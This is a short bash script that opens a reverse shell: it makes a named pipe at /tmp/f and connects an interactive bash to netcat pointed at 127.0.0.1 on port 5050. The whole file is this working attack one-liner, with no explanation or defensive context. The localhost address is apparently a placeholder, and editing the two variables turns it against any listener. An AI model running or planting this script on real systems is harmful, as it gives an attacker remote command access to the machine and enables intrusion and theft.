#!/bin/bash

port="5050"
ip="127.0.0.1"

rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc "$ip" "$port" > /tmp/f   
